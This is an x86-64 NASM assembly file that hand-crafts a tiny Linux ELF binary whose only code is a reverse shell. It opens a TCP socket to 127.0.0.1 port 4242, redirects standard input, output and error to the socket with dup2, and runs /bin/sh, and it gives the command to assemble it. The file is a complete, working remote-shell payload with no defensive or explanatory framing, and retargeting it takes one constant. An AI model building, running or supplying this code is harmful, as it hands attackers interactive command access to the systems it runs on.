; shell.s – minimal Linux x86-64 program
; Assemble with: nasm -f bin shell.s -o shell
BITS 64

org 0x400000 ; Default base address for 64-bit executables

ehdr:                         ; Elf64_Ehdr
    db 0x7F, "ELF"            ; e_ident: ELF magic
    db 2, 1, 1, 0             ; e_ident: 64 bit, little endian, version 1, target System V
    db 0, 0, 0, 0, 0, 0, 0, 0 ; e_ident: padding
    dw 2                      ; e_type
    dw 0x3E                   ; e_machine
    dd 1                      ; e_version
    dq _start                 ; e_entry
    dq phdr - $$              ; e_phoff
    dq 0                      ; e_shoff
    dd 0                      ; e_flags
    dw ehdr_size              ; e_ehsize
    dw phdr_size              ; e_phentsize
    dw 1                      ; e_phnum
    dw 0                      ; e_shentsize
    dw 0                      ; e_shnum
    dw 0                      ; e_shstrndx

ehdr_size equ $ - ehdr

phdr:            ; Elf64_Phdr
    dd 1         ; p_type
    dd 5         ; p_flags
    dq 0         ; p_offset
    dq $$        ; p_vaddr
    dq $$        ; p_paddr
    dq file_size ; p_filesz
    dq file_size ; p_memsz
    dq 0x1000    ; p_align

phdr_size equ $ - phdr

section .text
    global _start

_start:
    ;int socket(int domain, int type, int protocol);
    mov     rax, 41     ; syscall socket
    mov     rdi, 2      ; AF_INET
    mov     rsi, 1      ; SOCK_STREAM

    ; xor is faster than mov on modern cpus. magic?
    xor     rdx, rdx    ; protocol 0
    syscall
    mov     r12, rax    ; save sockfd

    ; sockaddr_in on stack
    mov     rbx, 0x0100007F92100002     ; IP + Port + AF_INET
    push    0x0000000000000000          ; sin_zero
    push    rbx                         ; sockaddr_in on stack
    mov     rsi, rsp                    ; pointer to sockaddr
    mov     rdx, 16                     ; size of sockaddr_in

    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    mov     rdi, r12
    mov     rax, 42      ; syscall connect
    syscall

    ; int dup2(int oldfd, int newfd);
    xor     rsi, rsi    ; rsi = 0
    mov     rax, 33     ; syscall dup2
    mov     rdi, r12    ; sockfd
    syscall             ; dup2(sockfd, 0)
    inc     rsi         ; rsi = 1
    mov     rax, 33     ; syscall dup2
    syscall             ; dup2(sockfd, 1)
    inc     rsi         ; rsi = 2
    mov     rax, 33     ; syscall dup2
    syscall             ; dup2(sockfd, 2)

    ; int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
    xor     rdx, rdx                ; envp = 0;
    mov     rbx, 0x0068732f6e69622f ; "/bin/sh\x00"
    push    rbx                     ; push to stack
    mov     rdi, rsp                ; filename = &"/bin/sh"
    push    rdx                     ; argv[1] = 0
    push    rdi                     ; argv[0] = &"/bin/sh"
    mov     rsi, rsp                ; argv = [&"/bin/sh", 0]
    mov     rax, 59                 ; execve syscall
    syscall                         ; execve ("/bin/sh", ["/bin/sh", 0], 0);

file_size equ $ - $$
